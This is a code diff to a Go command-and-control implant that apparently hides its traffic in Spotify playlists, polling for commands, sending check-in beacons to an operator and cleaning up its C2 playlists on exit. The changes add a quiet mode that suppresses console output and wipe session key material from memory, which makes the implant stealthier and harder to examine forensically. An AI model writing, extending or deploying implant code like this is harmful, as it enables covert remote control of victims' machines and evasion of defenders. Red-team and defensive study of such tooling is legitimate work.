@@ -27,7 +27,10 @@ import (
 
 // Implant polls for commands and executes them.
 type Implant struct {
-	client          *spotify.Client
+	client *spotify.Client
+	// NOTE: key is a Go string — it cannot be reliably wiped from
+	// memory (immutable, GC copies it). Only []byte session keys are
+	// zeroed (see zeroKey).
 	key             string
 	interval        int
 	jitter          int
@@ -100,14 +103,16 @@ func NewImplantWithOptions(client *spotify.Client, key string, opts ImplantOptio
 		ephPub = ephPriv.PublicKey()
 	}
 
-	fmt.Printf("\033[36m  Interval : %d-%ds | Session : %s\033[0m\n",
-		interval-jitter, interval+jitter, sessionID[:12])
-	fmt.Printf("  \033[90mClient ID : %s\033[0m\n", clientID)
-	if ephPub != nil {
-		fmt.Printf("  \033[90mX25519    : %s\033[0m\n",
-			hex.EncodeToString(ephPub.Bytes())[:24]+"...")
+	if !opts.Quiet {
+		fmt.Printf("\033[36m  Interval : %d-%ds | Session : %s\033[0m\n",
+			interval-jitter, interval+jitter, sessionID[:12])
+		fmt.Printf("  \033[90mClient ID : %s\033[0m\n", clientID)
+		if ephPub != nil {
+			fmt.Printf("  \033[90mX25519    : %s\033[0m\n",
+				hex.EncodeToString(ephPub.Bytes())[:24]+"...")
+		}
+		fmt.Println()
 	}
-	fmt.Println()
 	var allowedModules map[string]bool
 	if len(opts.AllowedModules) > 0 {
 		allowedModules = make(map[string]bool, len(opts.AllowedModules))
@@ -179,11 +184,22 @@ func (imp *Implant) getSessionKey() []byte {
 	return imp.sessionKey
 }
 
-// setSessionKey updates the ECDH session key (nil to reset).
+// setSessionKey updates the ECDH session key (nil to reset). The old
+// key's bytes are zeroed before replacement so they don't linger in
+// the heap until GC.
 func (imp *Implant) setSessionKey(key []byte) {
 	imp.skMu.Lock()
 	defer imp.skMu.Unlock()
+	if imp.sessionKey != nil {
+		zeroKey(imp.sessionKey)
+	}
 	imp.sessionKey = key
+}
+
+// wipeKeys zeroes the session key bytes (via setSessionKey(nil)).
+// Call on shutdown, before os.Exit.
+func (imp *Implant) wipeKeys() {
+	imp.setSessionKey(nil)
 }
 
 // sendCheckin sends a check-in beacon so the operator knows we connected.
@@ -364,7 +380,7 @@ func (imp *Implant) Run() {
 		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
 		defer cancel()
 		_ = imp.client.CleanC2Playlists(ctx, protocol.ChannelCmd, imp.key, -1)
-		imp.setSessionKey(nil)
+		imp.wipeKeys()
 		os.Exit(0)
 	}()
 
